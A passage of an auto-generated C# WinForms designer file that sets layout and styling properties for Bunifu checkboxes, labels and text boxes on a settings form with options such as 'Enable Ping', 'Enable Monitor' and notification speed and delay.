        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator5.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator5.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator5.BackgroundImage")));
        this.bunifuSeparator5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator5.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator5.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator5.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator5.LineThickness = 1;
        this.bunifuSeparator5.Location = new System.Drawing.Point(-1, 437);
        this.bunifuSeparator5.Name = "bunifuSeparator5";
        this.bunifuSeparator5.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator5.Size = new System.Drawing.Size(937, 11);
        this.bunifuSeparator5.TabIndex = 650;
        // 
        // ScrollToOutNotif
        // 
        this.ScrollToOutNotif.AllowBindingControlAnimation = true;
        this.ScrollToOutNotif.AllowBindingControlColorChanges = false;
        this.ScrollToOutNotif.AllowBindingControlLocation = true;
        this.ScrollToOutNotif.AllowCheckBoxAnimation = true;
        this.ScrollToOutNotif.AllowCheckmarkAnimation = true;
        this.ScrollToOutNotif.AllowOnHoverStates = true;
        this.ScrollToOutNotif.AutoCheck = true;
        this.ScrollToOutNotif.BackColor = System.Drawing.Color.Transparent;
        this.ScrollToOutNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ScrollToOutNotif.BackgroundImage")));
        this.ScrollToOutNotif.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.ScrollToOutNotif.BindingControl = this.label14;
        this.ScrollToOutNotif.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.ScrollToOutNotif.BorderRadius = 6;
        this.ScrollToOutNotif.Checked = false;
        this.ScrollToOutNotif.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.ScrollToOutNotif.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ScrollToOutNotif.CustomCheckmarkImage = null;
        this.ScrollToOutNotif.Location = new System.Drawing.Point(531, 154);
        this.ScrollToOutNotif.MinimumSize = new System.Drawing.Size(17, 17);
        this.ScrollToOutNotif.Name = "ScrollToOutNotif";
        this.ScrollToOutNotif.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScrollToOutNotif.OnCheck.BorderRadius = 6;
        this.ScrollToOutNotif.OnCheck.BorderThickness = 2;
        this.ScrollToOutNotif.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScrollToOutNotif.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.ScrollToOutNotif.OnCheck.CheckmarkThickness = 2;
        this.ScrollToOutNotif.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.ScrollToOutNotif.OnDisable.BorderRadius = 6;
        this.ScrollToOutNotif.OnDisable.BorderThickness = 2;
        this.ScrollToOutNotif.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ScrollToOutNotif.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.ScrollToOutNotif.OnDisable.CheckmarkThickness = 2;
        this.ScrollToOutNotif.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ScrollToOutNotif.OnHoverChecked.BorderRadius = 6;
        this.ScrollToOutNotif.OnHoverChecked.BorderThickness = 2;
        this.ScrollToOutNotif.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScrollToOutNotif.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.ScrollToOutNotif.OnHoverChecked.CheckmarkThickness = 2;
        this.ScrollToOutNotif.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ScrollToOutNotif.OnHoverUnchecked.BorderRadius = 6;
        this.ScrollToOutNotif.OnHoverUnchecked.BorderThickness = 1;
        this.ScrollToOutNotif.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ScrollToOutNotif.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.ScrollToOutNotif.OnUncheck.BorderRadius = 6;
        this.ScrollToOutNotif.OnUncheck.BorderThickness = 1;
        this.ScrollToOutNotif.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.ScrollToOutNotif.Size = new System.Drawing.Size(21, 21);
        this.ScrollToOutNotif.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.ScrollToOutNotif.TabIndex = 650;
        this.ScrollToOutNotif.ThreeState = false;
        this.ScrollToOutNotif.ToolTipText = null;
        // 
        // bunifuLabel5
        // 
        this.bunifuLabel5.AllowParentOverrides = false;
        this.bunifuLabel5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel5.AutoEllipsis = false;
        this.bunifuLabel5.AutoSize = false;
        this.bunifuLabel5.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel5.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel5.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel5.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel5.Location = new System.Drawing.Point(20, 221);
        this.bunifuLabel5.Name = "bunifuLabel5";
        this.bunifuLabel5.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel5.Size = new System.Drawing.Size(366, 17);
        this.bunifuLabel5.TabIndex = 568;
        this.bunifuLabel5.Text = "Prepare clients list";
        this.bunifuLabel5.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.bunifuLabel5.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // label13
        // 
        this.label13.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label13.AutoSize = true;
        this.label13.BackColor = System.Drawing.Color.Transparent;
        this.label13.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label13.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label13.ForeColor = System.Drawing.Color.Black;
        this.label13.Location = new System.Drawing.Point(413, 187);
        this.label13.Name = "label13";
        this.label13.Size = new System.Drawing.Size(105, 15);
        this.label13.TabIndex = 649;
        this.label13.Text = "Show close button";
        // 
        // TxPings
        // 
        this.TxPings.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxPings.AutoSize = true;
        this.TxPings.BackColor = System.Drawing.Color.Transparent;
        this.TxPings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxPings.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxPings.ForeColor = System.Drawing.Color.Black;
        this.TxPings.Location = new System.Drawing.Point(44, 389);
        this.TxPings.Name = "TxPings";
        this.TxPings.Size = new System.Drawing.Size(69, 15);
        this.TxPings.TabIndex = 647;
        this.TxPings.Text = "Enable Ping";
        // 
        // ShowCloseButtNotif
        // 
        this.ShowCloseButtNotif.AllowBindingControlAnimation = true;
        this.ShowCloseButtNotif.AllowBindingControlColorChanges = false;
        this.ShowCloseButtNotif.AllowBindingControlLocation = true;
        this.ShowCloseButtNotif.AllowCheckBoxAnimation = true;
        this.ShowCloseButtNotif.AllowCheckmarkAnimation = true;
        this.ShowCloseButtNotif.AllowOnHoverStates = true;
        this.ShowCloseButtNotif.AutoCheck = true;
        this.ShowCloseButtNotif.BackColor = System.Drawing.Color.Transparent;
        this.ShowCloseButtNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ShowCloseButtNotif.BackgroundImage")));
        this.ShowCloseButtNotif.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.ShowCloseButtNotif.BindingControl = this.label13;
        this.ShowCloseButtNotif.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.ShowCloseButtNotif.BorderRadius = 6;
        this.ShowCloseButtNotif.Checked = false;
        this.ShowCloseButtNotif.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.ShowCloseButtNotif.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ShowCloseButtNotif.CustomCheckmarkImage = null;
        this.ShowCloseButtNotif.Location = new System.Drawing.Point(389, 183);
        this.ShowCloseButtNotif.MinimumSize = new System.Drawing.Size(17, 17);
        this.ShowCloseButtNotif.Name = "ShowCloseButtNotif";
        this.ShowCloseButtNotif.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowCloseButtNotif.OnCheck.BorderRadius = 6;
        this.ShowCloseButtNotif.OnCheck.BorderThickness = 2;
        this.ShowCloseButtNotif.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowCloseButtNotif.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.ShowCloseButtNotif.OnCheck.CheckmarkThickness = 2;
        this.ShowCloseButtNotif.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.ShowCloseButtNotif.OnDisable.BorderRadius = 6;
        this.ShowCloseButtNotif.OnDisable.BorderThickness = 2;
        this.ShowCloseButtNotif.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ShowCloseButtNotif.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.ShowCloseButtNotif.OnDisable.CheckmarkThickness = 2;
        this.ShowCloseButtNotif.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ShowCloseButtNotif.OnHoverChecked.BorderRadius = 6;
        this.ShowCloseButtNotif.OnHoverChecked.BorderThickness = 2;
        this.ShowCloseButtNotif.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowCloseButtNotif.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.ShowCloseButtNotif.OnHoverChecked.CheckmarkThickness = 2;
        this.ShowCloseButtNotif.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ShowCloseButtNotif.OnHoverUnchecked.BorderRadius = 6;
        this.ShowCloseButtNotif.OnHoverUnchecked.BorderThickness = 1;
        this.ShowCloseButtNotif.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ShowCloseButtNotif.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.ShowCloseButtNotif.OnUncheck.BorderRadius = 6;
        this.ShowCloseButtNotif.OnUncheck.BorderThickness = 1;
        this.ShowCloseButtNotif.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.ShowCloseButtNotif.Size = new System.Drawing.Size(21, 21);
        this.ShowCloseButtNotif.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.ShowCloseButtNotif.TabIndex = 648;
        this.ShowCloseButtNotif.ThreeState = false;
        this.ShowCloseButtNotif.ToolTipText = null;
        // 
        // TxMonitors
        // 
        this.TxMonitors.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxMonitors.AutoSize = true;
        this.TxMonitors.BackColor = System.Drawing.Color.Transparent;
        this.TxMonitors.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxMonitors.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxMonitors.ForeColor = System.Drawing.Color.Black;
        this.TxMonitors.Location = new System.Drawing.Point(44, 362);
        this.TxMonitors.Name = "TxMonitors";
        this.TxMonitors.Size = new System.Drawing.Size(88, 15);
        this.TxMonitors.TabIndex = 649;
        this.TxMonitors.Text = "Enable Monitor";
        // 
        // label12
        // 
        this.label12.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label12.AutoSize = true;
        this.label12.BackColor = System.Drawing.Color.Transparent;
        this.label12.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label12.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label12.ForeColor = System.Drawing.Color.Black;
        this.label12.Location = new System.Drawing.Point(413, 158);
        this.label12.Name = "label12";
        this.label12.Size = new System.Drawing.Size(62, 15);
        this.label12.TabIndex = 647;
        this.label12.Text = "Show icon";
        // 
        // EnablePings
        // 
        this.EnablePings.AllowBindingControlAnimation = true;
        this.EnablePings.AllowBindingControlColorChanges = false;
        this.EnablePings.AllowBindingControlLocation = true;
        this.EnablePings.AllowCheckBoxAnimation = true;
        this.EnablePings.AllowCheckmarkAnimation = true;
        this.EnablePings.AllowOnHoverStates = true;
        this.EnablePings.AutoCheck = true;
        this.EnablePings.BackColor = System.Drawing.Color.Transparent;
        this.EnablePings.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnablePings.BackgroundImage")));
        this.EnablePings.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnablePings.BindingControl = this.TxPings;
        this.EnablePings.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnablePings.BorderRadius = 6;
        this.EnablePings.Checked = false;
        this.EnablePings.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnablePings.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnablePings.CustomCheckmarkImage = null;
        this.EnablePings.Location = new System.Drawing.Point(20, 385);
        this.EnablePings.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnablePings.Name = "EnablePings";
        this.EnablePings.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnablePings.OnCheck.BorderRadius = 6;
        this.EnablePings.OnCheck.BorderThickness = 2;
        this.EnablePings.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnablePings.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnablePings.OnCheck.CheckmarkThickness = 2;
        this.EnablePings.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnablePings.OnDisable.BorderRadius = 6;
        this.EnablePings.OnDisable.BorderThickness = 2;
        this.EnablePings.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnablePings.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnablePings.OnDisable.CheckmarkThickness = 2;
        this.EnablePings.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnablePings.OnHoverChecked.BorderRadius = 6;
        this.EnablePings.OnHoverChecked.BorderThickness = 2;
        this.EnablePings.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnablePings.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnablePings.OnHoverChecked.CheckmarkThickness = 2;
        this.EnablePings.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnablePings.OnHoverUnchecked.BorderRadius = 6;
        this.EnablePings.OnHoverUnchecked.BorderThickness = 1;
        this.EnablePings.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnablePings.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnablePings.OnUncheck.BorderRadius = 6;
        this.EnablePings.OnUncheck.BorderThickness = 1;
        this.EnablePings.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnablePings.Size = new System.Drawing.Size(21, 21);
        this.EnablePings.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnablePings.TabIndex = 646;
        this.EnablePings.ThreeState = false;
        this.EnablePings.ToolTipText = null;
        this.EnablePings.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnablePings_CheckedChanged);
        // 
        // ShowIconNotif
        // 
        this.ShowIconNotif.AllowBindingControlAnimation = true;
        this.ShowIconNotif.AllowBindingControlColorChanges = false;
        this.ShowIconNotif.AllowBindingControlLocation = true;
        this.ShowIconNotif.AllowCheckBoxAnimation = true;
        this.ShowIconNotif.AllowCheckmarkAnimation = true;
        this.ShowIconNotif.AllowOnHoverStates = true;
        this.ShowIconNotif.AutoCheck = true;
        this.ShowIconNotif.BackColor = System.Drawing.Color.Transparent;
        this.ShowIconNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ShowIconNotif.BackgroundImage")));
        this.ShowIconNotif.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.ShowIconNotif.BindingControl = this.label12;
        this.ShowIconNotif.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.ShowIconNotif.BorderRadius = 6;
        this.ShowIconNotif.Checked = false;
        this.ShowIconNotif.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.ShowIconNotif.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ShowIconNotif.CustomCheckmarkImage = null;
        this.ShowIconNotif.Location = new System.Drawing.Point(389, 154);
        this.ShowIconNotif.MinimumSize = new System.Drawing.Size(17, 17);
        this.ShowIconNotif.Name = "ShowIconNotif";
        this.ShowIconNotif.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowIconNotif.OnCheck.BorderRadius = 6;
        this.ShowIconNotif.OnCheck.BorderThickness = 2;
        this.ShowIconNotif.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowIconNotif.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.ShowIconNotif.OnCheck.CheckmarkThickness = 2;
        this.ShowIconNotif.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.ShowIconNotif.OnDisable.BorderRadius = 6;
        this.ShowIconNotif.OnDisable.BorderThickness = 2;
        this.ShowIconNotif.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ShowIconNotif.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.ShowIconNotif.OnDisable.CheckmarkThickness = 2;
        this.ShowIconNotif.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ShowIconNotif.OnHoverChecked.BorderRadius = 6;
        this.ShowIconNotif.OnHoverChecked.BorderThickness = 2;
        this.ShowIconNotif.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ShowIconNotif.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.ShowIconNotif.OnHoverChecked.CheckmarkThickness = 2;
        this.ShowIconNotif.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ShowIconNotif.OnHoverUnchecked.BorderRadius = 6;
        this.ShowIconNotif.OnHoverUnchecked.BorderThickness = 1;
        this.ShowIconNotif.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ShowIconNotif.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.ShowIconNotif.OnUncheck.BorderRadius = 6;
        this.ShowIconNotif.OnUncheck.BorderThickness = 1;
        this.ShowIconNotif.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.ShowIconNotif.Size = new System.Drawing.Size(21, 21);
        this.ShowIconNotif.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.ShowIconNotif.TabIndex = 646;
        this.ShowIconNotif.ThreeState = false;
        this.ShowIconNotif.ToolTipText = null;
        // 
        // SpeedNotif
        // 
        this.SpeedNotif.AcceptsReturn = false;
        this.SpeedNotif.AcceptsTab = false;
        this.SpeedNotif.AnimationSpeed = 200;
        this.SpeedNotif.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.SpeedNotif.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.SpeedNotif.AutoSizeHeight = true;
        this.SpeedNotif.BackColor = System.Drawing.Color.Transparent;
        this.SpeedNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("SpeedNotif.BackgroundImage")));
        this.SpeedNotif.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SpeedNotif.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.SpeedNotif.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.SpeedNotif.BorderColorIdle = System.Drawing.Color.Silver;
        this.SpeedNotif.BorderRadius = 2;
        this.SpeedNotif.BorderThickness = 1;
        this.SpeedNotif.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.SpeedNotif.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.SpeedNotif.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.SpeedNotif.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.SpeedNotif.DefaultText = "";
        this.SpeedNotif.FillColor = System.Drawing.Color.White;
        this.SpeedNotif.HideSelection = true;
        this.SpeedNotif.IconLeft = null;
        this.SpeedNotif.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.SpeedNotif.IconPadding = 10;
        this.SpeedNotif.IconRight = null;
        this.SpeedNotif.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.SpeedNotif.Lines = new string[0];
        this.SpeedNotif.Location = new System.Drawing.Point(620, 117);
        this.SpeedNotif.MaxLength = 32767;
        this.SpeedNotif.MinimumSize = new System.Drawing.Size(1, 1);
        this.SpeedNotif.Modified = false;
        this.SpeedNotif.Multiline = false;
        this.SpeedNotif.Name = "SpeedNotif";
        stateProperties105.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties105.FillColor = System.Drawing.Color.Empty;
        stateProperties105.ForeColor = System.Drawing.Color.Empty;
        stateProperties105.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SpeedNotif.OnActiveState = stateProperties105;
        stateProperties106.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties106.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties106.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties106.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.SpeedNotif.OnDisabledState = stateProperties106;
        stateProperties107.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties107.FillColor = System.Drawing.Color.Empty;
        stateProperties107.ForeColor = System.Drawing.Color.Empty;
        stateProperties107.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SpeedNotif.OnHoverState = stateProperties107;
        stateProperties108.BorderColor = System.Drawing.Color.Silver;
        stateProperties108.FillColor = System.Drawing.Color.White;
        stateProperties108.ForeColor = System.Drawing.Color.Empty;
        stateProperties108.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.SpeedNotif.OnIdleState = stateProperties108;
        this.SpeedNotif.Padding = new System.Windows.Forms.Padding(3);
        this.SpeedNotif.PasswordChar = '\0';
        this.SpeedNotif.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.SpeedNotif.PlaceholderText = "Speed {500}.ms";
        this.SpeedNotif.ReadOnly = false;
        this.SpeedNotif.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.SpeedNotif.SelectedText = "";
        this.SpeedNotif.SelectionLength = 0;
        this.SpeedNotif.SelectionStart = 0;
        this.SpeedNotif.ShortcutsEnabled = true;
        this.SpeedNotif.Size = new System.Drawing.Size(207, 28);
        this.SpeedNotif.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.SpeedNotif.TabIndex = 604;
        this.SpeedNotif.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.SpeedNotif.TextMarginBottom = 0;
        this.SpeedNotif.TextMarginLeft = 3;
        this.SpeedNotif.TextMarginTop = 1;
        this.SpeedNotif.TextPlaceholder = "Speed {500}.ms";
        this.SpeedNotif.UseSystemPasswordChar = false;
        this.SpeedNotif.WordWrap = true;
        this.SpeedNotif.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.SpeedNotif_KeyPress);
        // 
        // TxWindowsActive
        // 
        this.TxWindowsActive.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxWindowsActive.AutoSize = true;
        this.TxWindowsActive.BackColor = System.Drawing.Color.Transparent;
        this.TxWindowsActive.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxWindowsActive.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxWindowsActive.ForeColor = System.Drawing.Color.Black;
        this.TxWindowsActive.Location = new System.Drawing.Point(213, 281);
        this.TxWindowsActive.Name = "TxWindowsActive";
        this.TxWindowsActive.Size = new System.Drawing.Size(122, 15);
        this.TxWindowsActive.TabIndex = 645;
        this.TxWindowsActive.Text = "Enable Windows ctive";
        // 
        // TextDelayNotif
        // 
        this.TextDelayNotif.AcceptsReturn = false;
        this.TextDelayNotif.AcceptsTab = false;
        this.TextDelayNotif.AnimationSpeed = 200;
        this.TextDelayNotif.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextDelayNotif.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextDelayNotif.AutoSizeHeight = true;
        this.TextDelayNotif.BackColor = System.Drawing.Color.Transparent;
        this.TextDelayNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextDelayNotif.BackgroundImage")));
        this.TextDelayNotif.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextDelayNotif.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextDelayNotif.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextDelayNotif.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextDelayNotif.BorderRadius = 2;
        this.TextDelayNotif.BorderThickness = 1;
        this.TextDelayNotif.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextDelayNotif.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextDelayNotif.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextDelayNotif.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextDelayNotif.DefaultText = "";
        this.TextDelayNotif.FillColor = System.Drawing.Color.White;
        this.TextDelayNotif.HideSelection = true;
        this.TextDelayNotif.IconLeft = null;
        this.TextDelayNotif.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextDelayNotif.IconPadding = 10;
        this.TextDelayNotif.IconRight = null;
        this.TextDelayNotif.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextDelayNotif.Lines = new string[0];
        this.TextDelayNotif.Location = new System.Drawing.Point(389, 117);
        this.TextDelayNotif.MaxLength = 32767;
        this.TextDelayNotif.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextDelayNotif.Modified = false;
        this.TextDelayNotif.Multiline = false;
        this.TextDelayNotif.Name = "TextDelayNotif";
        stateProperties109.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties109.FillColor = System.Drawing.Color.Empty;
        stateProperties109.ForeColor = System.Drawing.Color.Empty;
        stateProperties109.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextDelayNotif.OnActiveState = stateProperties109;
        stateProperties110.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
